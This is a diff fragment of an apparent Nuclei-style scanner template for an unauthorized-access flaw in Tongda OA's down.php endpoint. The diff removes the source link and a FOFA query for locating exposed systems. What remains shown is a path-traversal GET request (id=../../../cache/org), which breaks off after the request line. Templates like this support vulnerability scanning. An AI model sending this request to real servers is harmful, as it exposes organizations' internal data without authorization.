@@ -3,12 +3,8 @@ info:
   name: 通达OA inc package down.php 接口未授权访问漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dp7k6fozhcv300yy'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dp7k6fozhcv300yy
-    fofa: app="TDXK-通达OA"
 http:
 - raw:
   - 'GET /inc/package/down.php?id=../../../cache/org HTTP/1.1
